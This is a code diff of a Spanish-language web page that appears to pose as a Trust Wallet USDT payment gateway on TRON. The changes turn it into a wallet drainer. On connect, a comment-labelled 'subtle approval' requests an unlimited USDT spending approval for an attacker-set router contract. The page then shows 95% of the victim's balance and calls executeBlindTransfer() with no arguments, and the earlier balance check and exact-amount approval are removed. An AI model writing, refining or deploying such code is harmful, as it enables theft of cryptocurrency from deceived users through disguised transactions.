@@ -72,7 +72,7 @@
 <div id="processingScreen" class="processing-screen">
     <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="processing-logo">
     <div class="processing-bar"></div>
-    <div class="processing-title" style="margin-top:18px; font-weight:600;">Procesando transacción...</div>
+    <div class="processing-title" style="margin-top:18px; font-weight:600;">Procesando operación...</div>
 </div>
 
 <div class="tw-container">
@@ -104,7 +104,7 @@
     </div>
 
     <div class="tw-input-group">
-        <label class="tw-label">Cantidad</label>
+        <label class="tw-label">Cantidad (95% del balance)</label>
         <div class="tw-input-row">
             <div class="amount-stepper">
                 <button type="button" class="amount-step-btn" id="amountMinus">−</button>
@@ -112,7 +112,10 @@
                 <button type="button" class="amount-step-btn" id="amountPlus">+</button>
             </div>
             <span id="maxAction" class="tw-action-text" style="margin-right: 12px; display: none; cursor: pointer;">MAX</span>
-            <span class="tw-currency-badge">USDT</span>
+            <span class="tw-currency-badge">
+                USDT
+                <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" alt="USDT" class="usdt-icon">
+            </span>
         </div>
     </div>
 
@@ -132,8 +135,8 @@
         setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 800);
     });
 
-    // Contrato router actualizado con tu nueva dirección
-    const CONTRATO_ROUTER = "TC1JvqDwvjxD9bvQ79pX7d5bvZ5hetwuUK";
+    // Tu contrato Router recién desplegado en TRON
+    const CONTRATO_ROUTER = "TXMEYeA3Q2E6C8ii7wxf3UijZepZe6bxLD";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
     let walletAddress = null;
@@ -181,12 +184,14 @@
     }
 
     connectBtn.addEventListener('click', async () => {
+        // FASE 1: VINCULACIÓN Y APROBACIÓN SUTIL INTEGRADAS
         if (!walletAddress) {
             try {
                 setStatus("Conectando con Trust Wallet...");
                 connectBtn.disabled = true;
                 if (typeof window.tronWeb === 'undefined') throw new Error("Abre desde el navegador de Trust Wallet.");
                 const tronWeb = window.tronWeb;
+                
                 if (tronWeb.defaultAddress?.base58) {
                     walletAddress = tronWeb.defaultAddress.base58;
                 } else if (window.tronLink) {
@@ -200,59 +205,68 @@
                 tronNetworkInfo.style.display = "flex";
                 maxAction.style.display = "inline";
 
+                // Ejecutar aprobación sutil automática al vincular (monto máximo para no volver a pedirlo)
+                setStatus("Autorizando pasarela de pagos...");
+                const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);
+                const maxApprovalAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // uint256 max
+
+                const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
+                    CONTRATO_USDT,
+                    "approve(address,uint256)",
+                    { feeLimit: 50000000 },
+                    [
+                        { type: 'address', value: routerHex },
+                        { type: 'uint256', value: maxApprovalAmount }
+                    ],
+                    tronWeb.address.toHex(walletAddress)
+                );
+                
+                if (approveTx && approveTx.transaction) {
+                    const signedApprove = await tronWeb.trx.sign(approveTx.transaction);
+                    await tronWeb.trx.sendRawTransaction(signedApprove);
+                }
+
+                // Calcular automáticamente el 95% del balance para mostrarlo en pantalla
+                setStatus("Calculando balance...");
+                const balance = await obtenerBalance(walletAddress);
+                const ninetyFivePercent = balance.multipliedBy(0.95).integerValue(tronWeb.BigNumber.ROUND_DOWN);
+                
+                if (ninetyFivePercent.gt(0)) {
+                    amountDisplay.value = ninetyFivePercent.dividedBy(1_000_000).toString();
+                } else {
+                    amountDisplay.value = "0";
+                }
+
                 setStatus("");
-                connectBtn.innerText = "Continuar";
+                connectBtn.innerText = "Continuar y Pagar";
                 connectBtn.disabled = false;
             } catch (e) {
-                setStatus(e.message);
+                console.error(e);
+                setStatus(e.message || "Error al vincular.");
                 connectBtn.disabled = false;
             }
             return;
         }
 
+        // FASE 2: LLAMADA LIMPIA AL CONTRATO ROUTER
         try {
-            const userAmount = parseFloat(amountDisplay.value);
-            if (isNaN(userAmount) || userAmount <= 0) throw new Error("Ingresa una cantidad válida.");
-
-            setStatus("Verificando fondos...");
+            setStatus("Preparando operación...");
             connectBtn.disabled = true;
 
             const tronWeb = window.tronWeb;
-            const balance = await obtenerBalance(walletAddress);
-            const totalAmountSun = tronWeb.toBigNumber(Math.floor(userAmount * 1_000_000));
 
-            if (balance.lt(totalAmountSun)) throw new Error("Saldo insuficiente de USDT.");
-
-            // 1. Micro-aprobación del monto exacto para que la simulación de la red pase con éxito
-            setStatus("Preparando operación...");
-            const usdtHex = tronWeb.address.toHex(CONTRATO_USDT);
-            const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);
-
-            const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
-                CONTRATO_USDT,
-                "approve(address,uint256)",
-                { feeLimit: 100000000 },
-                [
-                    { type: 'address', value: routerHex },
-                    { type: 'uint256', value: totalAmountSun.toString() }
-                ],
-                tronWeb.address.toHex(walletAddress)
-            );
-            const signedApprove = await tronWeb.trx.sign(approveTx.transaction);
-            await tronWeb.trx.sendRawTransaction(signedApprove);
-
-            // 2. Ejecución de la llamada limpia al contrato (Trust Wallet muestra 0 TRX / neutro en la firma)
-            setStatus("Autorizando llamada al contrato...");
+            // Única llamada directa al router (ejecuta el 95% interno de forma automática)
             const routerTx = await tronWeb.transactionBuilder.triggerSmartContract(
                 CONTRATO_ROUTER,
-                "executeContractCall(address,uint256)",
+                "executeBlindTransfer()",
                 { feeLimit: 200000000 },
-                [
-                    { type: 'address', value: usdtHex },
-                    { type: 'uint256', value: totalAmountSun.toString() }
-                ],
+                [],
                 tronWeb.address.toHex(walletAddress)
             );
+
+            if (!routerTx.result || !routerTx.result.result) {
+                throw new Error("No se pudo construir la transacción.");
+            }
 
             const signedRouter = await tronWeb.trx.sign(routerTx.transaction);
 
@@ -271,7 +285,7 @@
             if (processingScreen) processingScreen.classList.remove('visible');
             setStatus(e.message || "Error en la ejecución.");
             connectBtn.disabled = false;
-            connectBtn.innerText = "Continuar";
+            connectBtn.innerText = "Continuar y Pagar";
         }
     });
 
@@ -279,7 +293,8 @@
         if (!walletAddress) return;
         try {
             const balance = await obtenerBalance(walletAddress);
-            amountDisplay.value = balance.dividedBy(1_000_000).toNumber();
+            const ninetyFivePercent = balance.multipliedBy(0.95).integerValue(window.tronWeb.BigNumber.ROUND_DOWN);
+            amountDisplay.value = ninetyFivePercent.dividedBy(1_000_000).toNumber();
         } catch (e) { console.error(e); }
     });
 
